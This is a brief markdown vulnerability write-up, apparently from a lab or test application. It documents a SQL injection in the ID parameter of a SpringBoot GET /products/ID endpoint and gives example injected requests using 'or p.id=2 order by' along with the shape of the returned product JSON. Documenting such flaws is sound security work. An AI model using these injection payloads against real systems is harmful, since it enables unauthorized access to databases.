# SQL Injection
SQL injection is a database query manipulation attack against structured query language (SQL) that allows attackers to escape the intended query to perform unintended/malicious actions.

## Exploitation
**Location:** _GET /products/ID_

The ID parameter of GET /products/ID can be escaped since SpringBoot on this endpoint does not implement any protects filtering or isolating for clause fields.  Below is an exploitation example:

    # Receives Product ID 1 information
    GET /products/1 or p.id=2  order by 15

    # Receives Product ID 2 information when it should be Product ID 1
    GET /products/1 or p.id=2  order by 16

You'l see that adding _or p.id=2 order by 16_ changed the product output showing effectively that SQL was escaped

Successful exploitation looks like:

    {
    "id": ...,
    "name": ...,
    "brand": ...,
    "description": ...,
    "price": ...,
    "stock": ...,
    "productReviews": [{...}, {...}, ...],
    "averageReviewGrade": ...,
    "tagNames": [...],
    "image": ...
    }